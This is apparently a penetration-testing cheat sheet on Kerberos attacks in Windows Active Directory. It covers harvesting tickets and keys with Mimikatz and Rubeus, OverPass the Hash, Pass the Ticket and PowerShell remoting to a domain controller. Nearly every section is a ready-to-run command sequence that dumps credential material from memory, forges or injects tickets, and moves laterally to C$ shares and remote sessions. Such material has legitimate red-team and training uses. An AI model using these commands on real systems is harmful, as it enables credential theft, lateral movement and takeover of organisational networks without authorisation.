# Pass the Ticket Windows

## Harvesting Kerberos tickets from Windows

### [Mimikatz](https://github.com/ParrotSec/mimikatz) - Export tickets

Harvest all tickets from a system. The result is a list of files with the extension `.kirbi`, which contain the tickets.

```cmd
privilege::debug
sekurlsa::tickets /export
```

> The tickets that end with `$` correspond to the computer  account, which needs a ticket to interact with the Active Directory.  User tickets have the user's name, followed by an `@` that separates the service name and the domain, for example: `[randomvalue]-username@service-domain.local.kirbi`. If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.

### [Rubeus](https://github.com/GhostPack/Rubeus) - Export tickets

Export tickets using `Rubeus` and the option `dump`. This option can be used to dump all tickets (run as local administrator).

```cmd
# Tickets dumped will be in Base64
Rubeus.exe dump /nowrap
```

---

## Pass the Key aka. OverPass the Hash

[Example for OverPass the Hash](https://github.com/GhostPack/Rubeus#example-over-pass-the-hash)

### Mimikatz - Extract Kerberos keys

Forging tickets the users hash is needed; use mimikatz to dump encrytion keys

```cmd
mimikatz # privilege::debug
sekurlsa::ekeys
```

### Mimikatz

With the `AES256_HMAC` and `RC4_HMAC` keys, perform the OverPass the Hash.

```cmd
# This will create a new cmd.exe window 
sekurlsa::pth /domain:example.com /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
exit
```

### Rubeus

Forge a ticket using `Rubeus`, use the module `asktgt` with the username, domain, and hash which can be `/rc4`, `/aes128`, `/aes256`, or `/des`. 

```cmd
Rubeus.exe asktgt /domain:example.com /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
exit
dir \\DC01.example.com\c$
```

> Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

---

## Pass the Ticket

### Rubeus

With some Kerberos tickets, use them to move laterally within an environment.

```cmd
# Standard method
Rubeus.exe asktgt /domain:example.com /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt

# With mimikatz ticket
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-example.com.kirbi
exit
```

> Another way is to import the ticket into the current session using the `.kirbi` file from the disk.

Base64 Format

```cmd
# Convert the ticket
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-example.com.kirbi"))

# Pass the ticket
Rubeus.exe ptt /ticket:<ticket>
exit
dir \\DC01.example.com\c$
```

### Mimikatz

```cmd
mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-example.com.kirbi"
exit
dir \\DC01.example.com\c$
```

> Use the Mimikatz module `misc` to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

---

## PowerShell Remoting with Pass the Ticket

### Mimikatz

Use Mimikatz to import our ticket and then open a PowerShell console and connect to the target machine. Open `cmd.exe` and execute `mimikatz.exe`, import the ticket collected using `kerberos::ptt`. Once the ticket is imported into the `cmd.exe` session, launch a PowerShell from the same `cmd.exe` and use the command `Enter-PSSession` to connect to the target machine.

```cmd
# Import
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-example.com.kirbi"

# Launch PS and connect
powershell
Enter-PSSession -ComputerName DC01
```

### Rubeus

Rubeus has the option `createnetonly`, which creates a sacrificial process/logon session ([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). Request a new TGT with the option `/ptt`

```cmd
# Open new cmd window
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Import tick for lateral movement
Rubeus.exe asktgt /user:john /domain:example.com /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

powershell
Enter-PSSession -ComputerName DC01
```
